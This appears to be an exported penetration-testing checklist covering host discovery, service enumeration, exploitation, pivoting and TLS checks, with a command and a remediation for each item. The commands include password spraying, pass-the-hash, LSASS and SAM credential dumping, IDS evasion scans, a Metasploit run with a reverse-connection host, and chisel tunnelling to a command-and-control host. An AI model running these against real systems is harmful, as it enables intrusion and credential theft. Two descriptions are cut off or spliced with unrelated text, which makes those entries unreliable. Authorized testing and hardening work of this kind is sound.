items.title: Perform ICMP ping sweep across in-scope ranges
items.description: Send ICMP echo, timestamp, and address-mask requests across the target CIDR ranges to map responsive hosts before port scanning.
items.how_to_find:
Sweep the ranges for live hosts:

```
nmap -sn -PE -PP -PM 10.0.0.0/24 -oA sweep
fping -a -g 10.0.0.0/24 2>/dev/null
```

Record responders as candidate live hosts (some hosts block ICMP).
items.how_to_fix: This is a discovery step, not a vulnerability. Defensively: rate-limit/filter ICMP at the perimeter, segment networks, and monitor for sweep patterns (IDS). Ensure only intended hosts are reachable from the tester's vantage point.

items.title: Enumerate local hosts via ARP scanning
items.description: On a local segment, ARP requests reliably enumerate live hosts even when ICMP is filtered, since ARP cannot be firewalled at layer 2.
items.how_to_find:
On the local segment, ARP reveals hosts even when ICMP is filtered:

```
arp-scan --localnet
nmap -PR -sn 10.0.0.0/24
```
items.how_to_fix: Discovery step. Defensively: enable Dynamic ARP Inspection + DHCP snooping on switches, segment with VLANs/private VLANs, and monitor for ARP scanning. Restrict which hosts share a broadcast domain.

items.title: Discover hosts behind ICMP filtering via TCP/UDP probes
items.description: Use TCP SYN/ACK and UDP probes to common ports to identify hosts that drop ICMP but still respond to transport-layer probes.
items.how_to_find:
When ICMP is dropped, use TCP/UDP probes to elicit responses:

```
nmap -sn -PS22,80,443,3389 -PU53,161 10.0.0.0/24
```
items.how_to_fix: Discovery step. Defensively: default-deny at the firewall, only expose required ports, and alert on probe patterns to closed ports (which reveal filtering behavior).

items.title: Validate discovered hosts against the agreed scope
items.description: Cross-check every discovered live host against the engagement scope to avoid testing out-of-scope or third-party systems.
items.how_to_find:
Cross-check every responder against the authorized scope before touching it:

```
comm -23 <(sort live_hosts.txt) <(sort in_scope.txt)   # hosts NOT in scope
```

Any live host outside scope must be excluded and reported.
items.how_to_fix: Process/governance step: maintain an authoritative asset inventory and scope document, exclude out-of-scope hosts immediately, and get written authorization before testing. Prevents accidental testing of third-party systems.

items.title: Run a full TCP port scan (all 65535 ports)
items.description: A full-range TCP scan ensures services running on non-standard high ports are not missed by a default top-1000 scan.
items.how_to_find:
Scan all TCP ports, then service-scan the open ones:

```
nmap -p- --min-rate 2000 -T4 <ip> -oA allports
nmap -sCV -p $(grep open allports.gnmap | ...) <ip>
```
items.how_to_fix: Reduce exposed attack surface: close/​filter unused ports, put management services behind a VPN, apply host firewalls (default-deny), and segment. Re-scan to confirm only intended ports are reachable.

items.title: Scan key UDP services
items.description: UDP services (DNS, SNMP, NetBIOS, TFTP, IKE, NTP) are frequently overlooked yet expose high-value attack surface and amplification vectors.
items.how_to_find:
UDP hides high-value services (DNS, SNMP, TFTP, NTP, IKE):

```
nmap -sU --top-ports 50 -T4 <ip> -oA udp
```

Confirm `open|filtered` results with service-specific probes.
items.how_to_fix: Disable/​filter unnecessary UDP services, restrict SNMP/DNS/NTP to trusted sources, and rate-limit to mitigate amplification. Firewall UDP by default and re-scan.

items.title: Tune scan timing and apply IDS/firewall evasion
items.description: Aggressive scanning can trip IDS/IPS and corrupt results; tune timing templates, fragmentation, and decoys to balance stealth and accuracy.
items.how_to_find:
Adjust timing and try evasion to characterize filtering (authorized testing):

```
nmap -T2 --scan-delay 200ms <ip>
nmap -f --data-length 24 -D RND:5 <ip>
```
items.how_to_fix: Detection is the goal defensively: ensure IDS/IPS detects slow/fragmented scans, enable stateful firewalling that reassembles fragments, and alert on decoy/spoofed-source patterns. Don't rely on obscurity.

items.title: Use a fast mass scanner for large ranges then confirm with nmap
items.description: For large external ranges, a fast async scanner identifies open ports quickly; results should be re-confirmed with nmap service detection to reduce false positives.
items.how_to_find:
Mass-scan quickly, then verify:

```
masscan 10.0.0.0/16 -p1-65535 --rate 10000 -oL mass.txt
nmap -sCV -iL <(awk '/open/{print $4}' mass.txt) -oA confirm
```
items.how_to_fix: Discovery step. Defensively minimize exposed services and monitor for high-rate connection attempts. Ensure perimeter default-deny so mass scans find little.

sections.title: Host Discovery & Scanning — OS & Service Fingerprinting

items.title: Perform OS fingerprinting on live hosts
items.description: TCP/IP stack fingerprinting identifies the operating system and version, which narrows down applicable exploits and EOL risk.
items.how_to_find:
Fingerprint the OS from TCP/IP stack behavior:

```
nmap -O --osscan-guess <ip>
```
items.how_to_fix: Reduce banner/stack disclosure where feasible, keep OSes patched and supported, and segment. Fingerprinting itself isn't a vuln, but EOL OSes it reveals are — remediate those.

items.title: Detect service and version banners on open ports
items.description: Service/version detection maps each open port to a product and version, the foundation for CVE matching and default-credential checks.
items.how_to_find:
Grab service versions:

```
nmap -sV --version-all <ip>
```

Note exact product+version for CVE mapping.
items.how_to_fix: Minimize version disclosure in banners where the software allows, but prioritize patching over obscurity. Map versions to CVEs and update vulnerable services.

items.title: Run safe NSE discovery scripts for deeper fingerprinting
items.description: Nmap Scripting Engine default/discovery scripts extract richer service metadata (TLS info, SMB OS, HTTP titles) without intrusive exploitation.
items.how_to_find:
Use safe-category NSE scripts (no exploit):

```
nmap -sCV --script "safe and discovery" <ip>
```
items.how_to_fix: Discovery step. Defensively, ensure services don't leak excessive info via these scripts (e.g. SMB/SNMP/HTTP enum) and lock down anonymous enumeration.

items.title: Flag end-of-life operating systems and services
items.description: EOL software no longer receives security patches and represents persistent critical risk regardless of current known CVEs.
items.how_to_find:
Compare detected versions against vendor EOL dates:

```
nmap -sV <ip> -oX v.xml   # then map each product/version to EOL
```

Windows 7/2008, old RHEL/Ubuntu, legacy appliances = high findings (no security patches).
items.how_to_fix: Upgrade or decommission EOL systems; if unavoidable short-term, isolate them (dedicated VLAN, strict ACLs, virtual patching/IPS) and plan migration. Track EOL in the asset inventory.

items.title: Test for SMB/RPC null and guest sessions
items.description: Null or guest sessions can leak users, groups, shares, and password policy without credentials, fueling further attacks.
items.how_to_find:
Attempt anonymous/guest access:

```
nxc smb <ip> -u '' -p ''
nxc smb <ip> -u 'guest' -p ''
rpcclient -U '' -N <ip> -c 'enumdomusers'
```

Successful null/guest enumeration = high finding.
items.how_to_fix: Disable null/anonymous sessions: set `RestrictAnonymous`/`RestrictAnonymousSAM=1`, disable the guest account, and block SMB (445) at the perimeter. Require authenticated, least-privilege access. Re-test that null sessions fail.

items.title: Enumerate SMB shares and access permissions
items.description: Readable/writable shares often expose sensitive files, scripts, credentials, and backups accessible to low-privileged or anonymous users.
items.how_to_find:
List shares and test read/write with any obtained creds:

```
nxc smb <ip> -u <user> -p <pass> --shares
smbmap -H <ip> -u <user> -p <pass>
```

World-readable/writable sensitive shares are findings.
items.how_to_fix: Apply least-privilege share + NTFS permissions, remove `Everyone`/anonymous access, disable unnecessary shares, and audit access. Re-test with a low-priv account.

items.title: Check SMB signing requirement
items.description: Hosts with SMB signing not required are vulnerable to NTLM relay attacks, enabling authentication coercion to be relayed for code execution.
items.how_to_find:
Check whether SMB signing is required (unsigned enables NTLM relay):

```
nxc smb 10.0.0.0/24 --gen-relay-list relay.txt
nmap --script smb2-security-mode -p445 <ip>
```

`signing:False/enabled-not-required` = relay target.
items.how_to_fix: Require SMB signing via GPO (`Microsoft network server: Digitally sign communications (always) = Enabled`) on servers and clients. Disable NTLM where possible and prefer Kerberos. Re-scan to confirm signing is required.

items.title: Test for MS17-010 (EternalBlue) and legacy SMBv1
items.description: MS17-010 enables unauthenticated remote code execution over SMBv1 and remains common on unpatched/EOL Windows hosts.
items.how_to_find:
Check for SMBv1 and the MS17-010 vuln:

```
nmap --script smb-protocols,smb-vuln-ms17-010 -p445 <ip>
nxc smb <ip> -M ms17-010
```

Vulnerable = critical (unauth RCE / wormable).
items.how_to_fix: Apply MS17-010 patch, disable SMBv1 entirely (`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`), and block 445 at the perimeter. Re-scan to confirm SMBv1 is gone and the host is patched.

items.title: Test for default/weak SNMP community strings
items.description: Default community strings such as public/private grant read (or read-write) access to extensive device configuration data.
items.how_to_find:
Guess community strings:

```
onesixtyone -c communities.txt <ip>
nxc snmp <ip> -u '' -p '' --communities public,private
```

`public`/`private` accepted = high finding.
items.how_to_fix: Change default community strings, prefer SNMPv3 with auth+priv, restrict SNMP to management hosts via ACL, and disable it where unused. Re-test that defaults fail.

items.title: Perform SNMP walk to extract system information
items.description: SNMP walks can leak running processes, installed software, network interfaces, ARP tables, routes, and even local user accounts.
items.how_to_find:
Walk the MIB for users, processes, routes, ARP, installed software:

```
snmpwalk -v2c -c public <ip>
snmp-check <ip> -c public
```
items.how_to_fix: Restrict SNMP views to minimal OIDs, use SNMPv3 with least privilege, and firewall SNMP to the NMS only. Sensitive info via SNMP walk = exposure; lock it down and re-test.

items.title: Identify SNMPv1/v2c cleartext exposure
items.description: SNMPv1 and v2c send community strings and data in cleartext, allowing interception; only SNMPv3 provides authentication and encryption.
items.how_to_find:
Confirm the SNMP version (v1/v2c send community strings in cleartext):

```
snmpget -v1 -c public <ip> sysDescr.0
```
items.how_to_fix: Migrate to SNMPv3 (authPriv), disable v1/v2c, and restrict to management subnets over an encrypted/segmented path. Re-verify v1/v2c is disabled.

items.title: Assess SNMP read-write access impact
items.description: A read-write community string can allow reconfiguring network devices, exfiltrating configs (e.g.
items.how_to_find:
Test whether a write community allows configuration changes (authorized, non-destructive):

```
snmpwalk -v2c -c private <ip>    # RW string often 'private'
```

RW access can reconfigure devices/exfiltrate configs = high.
items.how_to_fix: Remove RW communities unless strictly required; if needed, use SNMPv3 with least privilege and ACLs, and monitor SET operations. Re-test that RW is not accessible.

references.title: MITRE ATT&CK - Network Device CLI / SNMP

items.title: Test for anonymous FTP access
items.description: Anonymous FTP can expose downloadable files and, when writable, allow upload of webshells or tampering with served content.
items.how_to_find:
Try anonymous login and list files:

```
nmap --script ftp-anon -p21 <ip>
curl ftp://<ip>/ --user anonymous:anon@x.com
```
items.how_to_fix: Disable anonymous FTP, require authenticated access over FTPS/SFTP, and restrict writable directories. Re-test that anonymous login fails.

items.title: Identify cleartext FTP/Telnet authentication
items.description: FTP and Telnet transmit credentials in cleartext, allowing interception on shared media or via MITM positioning.
items.how_to_find:
Confirm cleartext auth (credentials sniffable):

```
nmap -sV -p21,23 <ip>
# capture: tcpdump -i <if> port 21 or port 23 -A
```
items.how_to_fix: Replace FTP with SFTP/FTPS and Telnet with SSH; disable the cleartext daemons entirely. Re-scan to confirm 21/23 are closed.

items.title: Test FTP/Telnet for weak credentials
items.description: Legacy services often retain weak or default service accounts that allow authenticated access and data access or pivoting.
items.how_to_find:
Spray common creds (after confirming lockout policy):

```
hydra -L users.txt -P pass.txt ftp://<ip> -t 4 -f
hydra -L users.txt -P pass.txt telnet://<ip> -t 4 -f
```
items.how_to_fix: Enforce strong unique passwords/MFA, lockout/throttling, and move to SSH/SFTP. Rotate any cracked credentials. Re-test that weak creds are rejected and lockout works.

items.title: Check FTP/Telnet daemons for known CVEs
items.description: Specific FTP daemons (vsftpd 2.3.4 backdoor, ProFTPD mod_copy) and old telnetd builds have known RCE vulnerabilities.
items.how_to_find:
Map the daemon version to CVEs:

```
nmap -sV -p21,23 <ip>
searchsploit <product> <version>
```
items.how_to_fix: Patch or replace vulnerable daemons (prefer SSH/SFTP), remove legacy services, and virtual-patch via IPS if immediate patching isn't possible. Re-scan.

items.title: Attempt DNS zone transfer (AXFR)
items.description: A misconfigured DNS server allowing AXFR discloses the full zone, mapping internal hostnames, IPs, and infrastructure.
items.how_to_find:
Request a full zone transfer from each NS:

```
dig axfr example.com @<ns-ip>
```

A full record dump = finding (internal host disclosure).
items.how_to_fix: Restrict AXFR to authorized secondary NS only (`allow-transfer`), use TSIG, and firewall zone transfers. Re-test that AXFR is refused from arbitrary hosts.

items.title: Enumerate DNS records and subdomains
items.description: Brute-forcing records and subdomains expands the known attack surface and reveals dev/staging and internal-only hosts.
items.how_to_find:
Enumerate records and brute subdomains:

```
dnsrecon -d example.com -t std
subfinder -d example.com -silent | dnsx -silent
```
items.how_to_fix: Discovery step. Defensively: minimize public DNS records, split-horizon DNS (don't expose internal names externally), and monitor for enumeration. Retire stale records to prevent subdomain takeover.

items.title: Check for open recursive resolver
items.description: Open resolvers can be abused for DNS amplification DDoS and cache poisoning, harming the organization and third parties.
items.how_to_find:
Test whether the resolver answers recursive queries for arbitrary domains:

```
dig @<ip> google.com +short    # if it resolves, recursion is open
```

Open recursion enables DNS amplification DDoS.
items.how_to_fix: Disable recursion on authoritative servers, restrict recursion to internal clients only (`allow-recursion`), and enable response rate limiting. Re-test from an external vantage point.

items.title: Query DNS server version and software
items.description: version.bind queries can disclose the resolver software/version, aiding CVE matching against known BIND/Windows DNS issues.
items.how_to_find:
Fingerprint the server:

```
dig @<ip> version.bind chaos txt +short
nmap -sV -p53 <ip>
```
items.how_to_fix: Suppress version disclosure (`version "hidden";`) as hardening, but prioritize patching BIND/other software to non-vulnerable versions. Map version to CVEs and update.

items.title: Identify RDP/SSH exposed to untrusted networks
items.description: Internet-facing RDP/SSH is a primary initial-access vector; exposure should be flagged even before credential testing.
items.how_to_find:
Find management services reachable from untrusted zones:

```
nmap -p22,3389 --open <range>
```

RDP/SSH exposed to the internet is a high finding.
items.how_to_fix: Place RDP/SSH behind a VPN/bastion, restrict source IPs via firewall, require MFA, and never expose them directly to the internet. Re-scan externally to confirm they're unreachable.

items.title: Test RDP/SSH for weak or reused credentials
items.description: Weak, default, or reused credentials on RDP/SSH frequently provide direct interactive access to hosts.
items.how_to_find:
After confirming lockout policy, spray cautiously:

```
nxc ssh <ip> -u users.txt -p pass.txt
hydra -L users.txt -P pass.txt rdp://<ip> -t 1 -f
```
items.how_to_fix: Enforce strong unique passwords + MFA, key-based SSH auth (disable passwords), Network Level Authentication for RDP, and lockout/throttling. Rotate cracked creds. Re-test.

items.title: Review SSH configuration weaknesses
items.description: Permissive SSH config (root login, password auth, weak KEX/ciphers, agent forwarding) increases attack surface and lateral-movement risk.
items.how_to_find:
Audit the SSH config/algorithms:

```
ssh-audit <ip>
nmap --script ssh2-enum-algos -p22 <ip>
```

Password auth, root login, weak KEX/ciphers/MACs are findings.
items.how_to_fix: Set `PermitRootLogin no`, `PasswordAuthentication no` (keys + MFA), disable weak KEX/ciphers/MACs, and keep OpenSSH patched. Re-run ssh-audit to confirm hardening.

items.title: Check RDP for BlueKeep (CVE-2019-0708) and missing NLA
items.description: BlueKeep is a wormable pre-auth RDP RCE; missing Network Level Authentication also weakens RDP against credential and DoS attacks.
items.how_to_find:
Check for BlueKeep and NLA:

```
nmap --script rdp-vuln-ms12-020,rdp-ntlm-info -p3389 <ip>
# BlueKeep: use a vetted scanner/module in a safe manner
```

Vulnerable/​no-NLA = critical (unauth RCE).
items.how_to_fix: Patch CVE-2019-0708, require Network Level Authentication, put RDP behind a VPN/bastion with MFA, and restrict source IPs. Re-scan to confirm patched + NLA enforced.

items.title: Test for unauthenticated MongoDB/Redis access
items.description: MongoDB and Redis frequently ship bound to all interfaces without authentication, exposing full data read/write to anyone on the network.
items.how_to_find:
Connect without credentials:

```
redis-cli -h <ip> ping
mongosh "mongodb://<ip>:27017" --eval 'db.adminCommand({listDatabases:1})'
```

A response without auth = critical (full data access / RCE via Redis).
items.how_to_fix: Enable authentication (`requirepass`/SCRAM), bind to localhost/private interfaces, enable `protected-mode`, firewall the ports, and enable TLS. Rotate exposed data/secrets. Re-test that auth is required.

items.title: Test MSSQL for weak sa credentials and xp_cmdshell
items.description: A weak sa password on MSSQL can lead to command execution via xp_cmdshell and lateral movement via linked servers.
items.how_to_find:
Test `sa` and command execution:

```
nxc mssql <ip> -u sa -p passwords.txt
nxc mssql <ip> -u sa -p <pass> -x "whoami"   # via xp_cmdshell
```
items.how_to_fix: Use strong `sa` passwords (or disable `sa`), disable `xp_cmdshell`, run SQL Server as a least-privilege service account, enforce Windows auth, and firewall 1433. Rotate creds and re-test.

items.title: Test MySQL for weak credentials and over-privilege
items.description: Weak MySQL credentials plus FILE privilege or remote root can expose data and, in some cases, lead to file read/write or code execution.
items.how_to_find:
Test creds and privileges:

```
nxc mysql <ip> -u root -p passwords.txt
mysql -h <ip> -u root -p<pass> -e "SHOW GRANTS; SELECT user,host FROM mysql.user;"
```

`root@%`, `FILE` priv, or weak creds are findings.
items.how_to_fix: Enforce strong passwords, remove `@%`/anonymous accounts, grant least privilege (no `FILE`/`SUPER` for apps), bind to private interfaces, and firewall 3306. Re-test.

items.title: Identify databases exposed beyond their app tier
items.description: Databases should only be reachable from their application tier; broader network exposure increases breach and ransomware impact.
items.how_to_find:
Confirm DB ports reachable from non-app segments:

```
nmap -p1433,3306,5432,27017,6379,1521 --open <range>
```

DB reachable from user/DMZ segments = high finding.
items.how_to_fix: Segment databases into a dedicated tier reachable only from app servers (host firewall + network ACLs/security groups), never from user networks or the internet. Re-scan from other segments to confirm isolation.

items.title: Run unauthenticated vulnerability scans
items.description: Unauthenticated scanning models an external attacker view, surfacing exposed and exploitable network services.
items.how_to_find:
Scan from the network without credentials to see the external attacker view:

```
nmap -sCV --script vuln <ip>
nuclei -u https://<host> -severity high,critical
# or Nessus/OpenVAS unauthenticated policy
```
items.how_to_fix: Remediate confirmed issues by patching/hardening; reduce exposed services. Use unauthenticated results to prioritize internet/edge-facing risk. Re-scan after fixes.

items.title: Run authenticated/credentialed scans
items.description: Credentialed scans inspect installed patches and configuration from the inside, finding issues invisible to network-only scans.
items.how_to_find:
Scan with valid host credentials for accurate patch/config assessment:

```
# Nessus 'credentialed' policy with SSH/SMB creds, or:
nxc smb <range> -u <user> -p <pass> -M <enum-modules>
```

Credentialed scans reveal missing patches unauthenticated scans miss.
items.how_to_fix: Feed credentialed findings into patch management, fix configuration drift, and track remediation SLAs. Store scan creds securely (least privilege, rotated). Re-scan to confirm closure.

items.title: Triage and validate scanner findings
items.description: Automated scanners produce false positives and inflated severities; manual validation is required before reporting.
items.how_to_find:
Manually validate before reporting (scanners produce false positives):

```
searchsploit <product> <version>
# confirm the specific vuln with a targeted, safe check
```
items.how_to_fix: Process step: verify each finding, assign real severity/exploitability, deduplicate, and drop false positives. Report validated issues with evidence and reproduction steps.

items.title: Run targeted template-based checks for known issues
items.description: Template-driven scanners quickly confirm specific known-vulnerable conditions (exposed panels, misconfigs, CVEs) with high precision.
items.how_to_find:
Use templated checks for known CVEs/misconfigs:

```
nuclei -u https://<host> -t cves/ -t misconfiguration/
nmap --script <specific-vuln-script> -p<port> <ip>
```
items.how_to_fix: Remediate matched issues (patch/config), and keep templates updated. Automate recurring template scans and re-run after fixes.

sections.title: Vulnerability Identification — Missing Patches & EOL Software

items.title: Map service versions to known CVEs
items.description: Version-to-CVE mapping highlights exploitable services; prioritize those in active-exploitation catalogs.
items.how_to_find:
Correlate detected versions with CVE databases:

```
nmap -sV <ip> -oX v.xml
searchsploit <product> <version>
# or feed versions to a CVE lookup / vulners NSE
nmap --script vulners -sV <ip>
```
items.how_to_fix: Patch to fixed versions on a risk-based schedule, prioritizing internet-facing and RCE-class CVEs. Track in vuln management and re-scan to confirm the CVE is closed.

items.title: Identify unsupported/EOL services and OSes
items.description: EOL components receive no patches and constitute standing risk; they should be reported regardless of current CVE count.
items.how_to_find:
List detected products/OSes and compare to vendor EOL:

```
nmap -sV -O <range> -oA fp
```

Any unsupported version (no security updates) is a high finding.
items.how_to_fix: Upgrade/decommission EOL systems; where unavoidable, isolate on a restricted VLAN with strict ACLs + IPS virtual patching and a migration plan. Track EOL dates in the inventory.

items.title: Prioritize unauthenticated RCE-class vulnerabilities
items.description: Pre-auth remote code execution on exposed services represents the most severe and time-sensitive findings.
items.how_to_find:
Filter findings for pre-auth remote code execution (highest risk):

```
# from scan output, flag CVEs tagged 'Remote' + 'unauthenticated' + high CVSS/EPSS
```

Internet-facing unauth RCE = critical, fix first.
items.how_to_fix: Emergency-patch or take offline internet-facing unauth-RCE targets immediately; add compensating controls (WAF/IPS, ACLs) until patched. Track with the tightest SLA and re-validate.

items.title: Detect missing hardening and patch baseline drift
items.description: Hosts drifting from a hardening baseline accumulate missing patches and weakened settings over time.
items.how_to_find:
Compare hosts against a hardening baseline (CIS) and expected patch level:

```
# Windows: run a CIS-CAT / config audit; Linux:
lynis audit system
```
items.how_to_fix: Enforce a hardening baseline via configuration management (GPO/Ansible), remediate drift, and monitor for changes. Automate patch deployment and re-audit periodically.

items.title: Test network devices for vendor default credentials
items.description: Routers, switches, printers, IPMI/iDRAC, and appliances frequently retain documented default credentials.
items.how_to_find:
Test routers/switches/firewalls/printers/iLO/iDRAC for factory creds:

```
nxc <proto> <ip> -u admin -p admin
# reference vendor default-credential lists (e.g. cirt.net DPT)
```
items.how_to_fix: Change all default credentials, disable unused management interfaces, restrict management to a dedicated network, and enforce MFA. Inventory devices and re-test defaults fail.

items.title: Test services for weak/blank passwords
items.description: Weak or blank passwords on exposed services (SMB, SSH, RDP, DB, web panels) provide easy authenticated footholds.
items.how_to_find:
Spray common/blank passwords against discovered services (after lockout check):

```
nxc smb <range> -u users.txt -p pass.txt --continue-on-success
hydra -L users.txt -P pass.txt <service>://<ip> -t 4
```
items.how_to_fix: Enforce a strong password policy, block blank/common passwords (breached-password check), add MFA, and lockout/throttling. Rotate weak creds and re-test.

items.title: Test exposed management panels for default logins
items.description: Tomcat Manager, Jenkins, web admin consoles, and similar panels often ship with default or guessable credentials enabling RCE.
items.how_to_find:
Find and test admin panels (web UIs, Tomcat, Jenkins, iDRAC, ESXi):

```
nuclei -u https://<host> -t default-logins/ -t exposed-panels/
```

Default/weak admin logins on a panel = critical.
items.how_to_fix: Change defaults, put management panels behind VPN/SSO+MFA, restrict source IPs, and remove internet exposure. Rotate creds and re-test.

items.title: Confirm lockout and rate-limiting before spraying
items.description: Password attacks risk account lockout and outages; verifying lockout policy first prevents disruption and aligns with rules of engagement.
items.how_to_find:
Before any spraying, verify the account-lockout threshold to avoid mass lockouts:

```
nxc smb <dc-ip> -u <user> -p <pass> --pass-pol
```

Then keep attempts safely under the threshold with delays.
items.how_to_fix: Defensively: set sane lockout thresholds + observation windows, enable smart lockout / rate-limiting, and alert on spray patterns (many accounts, few attempts each). This is an operational safety + defense control.

items.title: Validate exploits in a safe manner before use
items.description: Confirm an exploit applies and is non-destructive (or coordinate a maintenance window) before running it against production services.
items.how_to_find:
Verify version/preconditions and prefer check-only modes before running any exploit (authorized testing):

```
msfconsole -q -x "use <module>; set RHOSTS <ip>; check"
```

Confirm the target is genuinely vulnerable and understand blast radius first.
items.how_to_fix: Process/safety step: test exploits against a lab replica when possible, use non-destructive/check modes, coordinate a maintenance window, and have rollback ready. Document preconditions and impact before exploiting production.

items.title: Demonstrate remote code execution on vulnerable services
items.description: Proving RCE (e.g. Treat failures here as release blockers.
items.how_to_find:
Prove impact with a controlled, minimal payload (e.g. `id`/`whoami`), avoiding disruption:

```
msfconsole -q -x "use <module>; set RHOSTS <ip>; set LHOST <me>; run"
```

Capture proof (command output, hostname) as evidence.
items.how_to_fix: Remediate the underlying vulnerability (patch/config), restrict network access to the service, and add IPS/WAF. Rotate any exposed credentials and re-test that RCE no longer works.

references.title: MITRE ATT&CK - Exploitation of Remote Services (T1210)

items.title: Attempt local privilege escalation post-foothold
items.description: Initial access is often low-privileged; escalating to root/SYSTEM enables credential harvesting and broader impact.
items.how_to_find:
Enumerate privesc paths on the foothold:

```
# Linux
./linpeas.sh; sudo -l
# Windows
winpeas.exe; whoami /priv
```
items.how_to_fix: Remediate the specific privesc (patch kernel/service, fix sudo/service perms, remove SeImpersonate misuse, correct file/registry ACLs), apply least privilege, and harden. Re-test the path is closed.

items.title: Track artifacts and clean up after exploitation
items.description: Payloads, accounts, and uploaded files must be logged and removed to avoid leaving the environment less secure.
items.how_to_find: Log every artifact created (uploaded tools, shells, accounts, config changes) during testing for later removal.
items.how_to_fix: Process step: maintain an artifact log, remove all payloads/accounts/backdoors after testing, restore modified configs, and confirm with the client. Provides a clean environment and auditable trail.

items.title: Establish port forwarding through a compromised host
items.description: Local/remote/dynamic port forwarding exposes internal services to the tester through a foothold host.
items.how_to_find:
Forward a port from an internal host through the foothold (authorized):

```
ssh -L 13389:<internal>:3389 user@<foothold>
chisel client <c2>:8080 R:13389:<internal>:3389
```
items.how_to_fix: Defensively: enforce network segmentation + egress filtering so a compromised host can't reach deeper segments, monitor for tunneling (chisel/ssh -L), and apply host-based firewalls. Detection of pivoting indicates weak segmentation to fix.

items.title: Pivot through a SOCKS proxy with proxychains
items.description: A SOCKS tunnel plus proxychains lets standard tools reach internal segments through the foothold host.
items.how_to_find:
Stand up a SOCKS proxy and route tools through it:

```
ssh -D 1080 user@<foothold>       # or: chisel ... socks
proxychains nmap -sT <internal-range>
```
items.how_to_fix: Segment networks and filter egress so pivots fail; monitor for SOCKS/tunnel traffic and unusual east-west connections. Restrict which hosts can reach sensitive segments.

items.title: Map and test network segmentation boundaries
items.description: Pivoting reveals whether segmentation actually isolates sensitive zones (PCI, OT, management) from general user networks.
items.how_to_find:
From each segment, test what other segments/ports are reachable:

```
nmap -sT -Pn --open <other-segment-range>
```

Reachability that violates the intended segmentation policy is a finding.
items.how_to_fix: Implement least-privilege segmentation (VLANs + firewall/ACLs, microsegmentation), default-deny east-west, and validate with periodic segmentation tests. Close any unauthorized cross-segment paths.

items.title: Chain multiple pivots to reach deep segments
items.description: Multi-hop pivoting reaches segments isolated from the initial foothold, demonstrating defense-in-depth gaps.
items.how_to_find:
Chain proxies through successive footholds to reach isolated segments (authorized):

```
# double pivot: chisel/ssh from host A -> B -> C, layering SOCKS
```

Reaching a "protected" segment via chaining shows insufficient isolation.
items.how_to_fix: Enforce strict multi-tier segmentation with default-deny between tiers, jump-host-only access to sensitive zones, and monitoring for chained connections. Ensure critical segments aren't reachable via intermediary hosts.

sections.title: Exploitation & Pivoting — Lateral Movement & Credential Reuse

items.title: Test cleartext credential reuse across hosts
items.description: Reused local-admin or service credentials allow rapid spread across many hosts once one is compromised.
items.how_to_find:
Try harvested cleartext creds across the estate:

```
nxc smb <range> -u <user> -p <pass> --continue-on-success
```

`Pwn3d!`/access on multiple hosts = critical (shared local/admin creds).
items.how_to_fix: Use unique per-host local admin passwords (LAPS), least privilege, and tiered admin model. Rotate reused creds and monitor for credential reuse. Re-test that one cred no longer unlocks many hosts.

items.title: Test pass-the-hash with harvested NTLM hashes
items.description: NTLM hashes can authenticate without cracking, enabling lateral movement to hosts sharing the same local admin hash.
items.how_to_find:
Authenticate with an NTLM hash (no plaintext needed):

```
nxc smb <range> -u <user> -H <ntlm-hash> --continue-on-success
```

Successful PtH across hosts = critical.
items.how_to_fix: Deploy LAPS (unique local admin passwords), restrict local admin, enable Credential Guard, use the protected-users group + tiering, and require SMB signing. Rotate hashes (change passwords). Re-test PtH fails.

items.title: Demonstrate remote execution via SMB/WMI/WinRM
items.description: Valid credentials enable remote command execution through native protocols, the backbone of practical lateral movement.
items.how_to_find:
Execute commands remotely with valid creds/hash:

```
nxc smb <ip> -u <user> -p <pass> -x "whoami"
impacket-wmiexec <domain>/<user>:<pass>@<ip>
evil-winrm -i <ip> -u <user> -p <pass>
```
items.how_to_fix: Restrict who holds local/domain admin, segment admin protocols (SMB/WMI/WinRM) to jump hosts, enable logging/EDR for remote exec, and apply tiered administration. Rotate compromised creds and re-test.

items.title: Harvest additional credentials from compromised hosts
items.description: Memory, registry, files, and config often hold further credentials that unlock new hosts and accounts.
items.how_to_find:
Dump credentials from memory/SAM/LSASS (authorized):

```
nxc smb <ip> -u <user> -p <pass> --sam --lsa
impacket-secretsdump <domain>/<user>:<pass>@<ip>
```
items.how_to_fix: Enable Credential Guard + LSA protection (RunAsPPL), limit admin logons to sensitive hosts (tiering), disable WDigest, deploy EDR, and use LAPS. Rotate exposed creds and re-test dumping is blocked.

items.title: Identify deprecated SSL/TLS protocol versions
items.description: SSLv2/SSLv3 and TLS 1.0/1.1 are deprecated and vulnerable (POODLE, BEAST); only TLS 1.2+ should be enabled.
items.how_to_find:
Enumerate supported protocols:

```
sslscan <host>:443
nmap --script ssl-enum-ciphers -p443 <host>
```

SSLv2/SSLv3/TLS 1.0/1.1 enabled = finding.
items.how_to_fix: Disable SSLv2/v3 and TLS 1.0/1.1; allow only TLS 1.2/1.3. Update server config/load balancer and re-scan with sslscan to confirm only modern protocols remain.

references.title: OWASP Transport Layer Security Cheat Sheet

items.title: Detect weak cipher suites and key exchange
items.description: NULL, EXPORT, RC4, DES/3DES, and anonymous suites, or weak DH parameters, undermine confidentiality and integrity.
items.how_to_find:
Check ciphers and key exchange strength:

```
testssl.sh --cipher-per-proto --fs <host>
```

RC4/3DES/EXPORT/NULL ciphers or weak DH (<2048) are findings.
items.how_to_fix: Configure a modern cipher suite (AEAD only, forward secrecy), disable weak ciphers, use ECDHE and >=2048-bit DH / EC keys. Re-scan to confirm.

references.title: OWASP Transport Layer Security Cheat Sheet

items.title: Validate certificate trust, validity, and naming
items.description: Expired, self-signed, wrong-CN/SAN, or weak-signature certificates enable MITM and erode trust in the service.
items.how_to_find:
Inspect the certificate:

```
echo | openssl s_client -connect <host>:443 -servername <host> 2>/dev/null | openssl x509 -noout -dates -subject -issuer
```

Expired, self-signed (where trust expected), or name-mismatched certs are findings.
items.how_to_fix: Use certificates from a trusted CA matching the hostname/SANs, automate renewal (ACME), and monitor expiry. Enable HSTS. Re-verify with openssl/testssl.

references.title: OWASP Transport Layer Security Cheat Sheet

items.title: Test for known TLS vulnerabilities (Heartbleed, ROBOT)
items.description: Library-level flaws like Heartbleed (CVE-2014-0160) and ROBOT can leak memory or enable decryption regardless of config.
items.how_to_find:
Test for named TLS bugs:

```
testssl.sh --vulnerable <host>
nmap --script ssl-heartbleed -p443 <host>
```

Heartbleed/ROBOT/CCS/POODLE positives are high findings.
